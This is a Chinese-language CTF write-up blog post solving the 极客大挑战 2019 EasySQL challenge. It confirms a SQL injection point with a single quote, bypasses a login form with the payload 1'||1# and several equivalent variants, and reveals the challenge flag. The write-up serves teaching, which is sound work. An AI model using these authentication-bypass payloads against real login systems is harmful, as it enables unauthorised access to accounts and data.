---
title: "[极客大挑战 2019] EasySQL：从一个单引号到万能密码"
date: 2026-10-22 20:40:00
updated: 2026-10-28 20:30:00
categories:
  - CTF
  - Web
  - SQL 注入
tags:
  - SQL 注入
  - 万能密码
  - 极客大挑战
description: 最经典的登录框注入：加一个单引号确认注入点，再用 1'||1# 注释掉密码判断，不输入密码也能登录并拿到 flag。
difficulty: 入门
topic: SQL 注入
series: SQL 注入
series_order: 1
permalink: 2026/10/22/web-ctf-sql-easysql-geek/
---


## 观察题目

打开靶场，是一个很朴素的登录框：

![EasySQL 登录页面](01-login-page.png)

*图 1：登录页面，提示语是"我是 cl4y，是一个 WEB 开发程序员……"*

随便输入 `1 / 1` 登录，可以看到请求直接走 `GET`，参数都暴露在地址栏里：

![check.php 的 URL](02-check-url.png)

*图 2：用户名和密码通过 `check.php?username=1&password=1` 传递*

这给了我们两个重要信息：

1. 参数名是 `username` 和 `password`；
2. 可以直接在地址栏里改 payload，不需要抓包。

## 第一步：确认注入点

在 `username` 后面加一个单引号：

```http
http://b7545d1d777fc16949130ff9.http-ctf2.dasctf.com/check.php?username=1%27&password=1
```

页面直接抛出了 MariaDB 的语法错误：

![username 加单引号报错](03-username-quote-error.png)

*图 3：单引号被原样带进了 SQL，说明输入没有过滤*

对 `password` 做同样的测试，也会报错：

![password 加单引号报错](04-password-quote-error.png)

*图 4：`password` 位置同样可以注入*

到这里可以确认：**`username` 和 `password` 两个位置都存在 SQL 注入**。

## 第二步：构造万能密码

既然报错说明引号参与了解析，那就把引号闭合掉，再让条件恒为真：

```text
username = 1'||1#
password = 任意值（比如 1）
```

完整 URL（已做编码）：

```text
基础地址：http://b7545d1d777fc16949130ff9.http-ctf2.dasctf.com/check.php
查询参数：?username=1%27%7C%7C1%23&password=1
```

拆开看这个 payload：

- `1'`：闭合 `username='` 前面的单引号；
- `||`：MySQL 中的逻辑或，等价于 `or`；
- `1`：恒为真；
- `#`：注释掉后面的 `AND password='...'` 和多余的引号。

后端拼出来的 SQL 大致是：

```sql
SELECT * FROM users
WHERE username='1'||1#' AND password='1'
```

因为 `'1'||1` 为真，数据库返回了第一条用户记录，页面提示 `Login Success!`，flag 直接显示出来：

![EasySQL 拿到 flag](05-easysql-flag.png)

*图 5：登录成功，页面回显 flag*

```text
CTF2{6b435354-1488-4755-992b-aa4d2901ee47}
```

## 等价的几种写法

下面这些 payload 在这道题里都能达到同样效果，可以自己动手对比：

```text
1' or 1=1#
1' or '1'='1'#
1'||1-- -
```

{% note warning %}
`--` 注释要求后面**必须有一个空格**。在 URL 里写 `-- -` 时，空格会被编码成 `%20`，最终是 `--%20-`。如果直接写 `--`，MySQL 不会把它当注释。
{% endnote %}
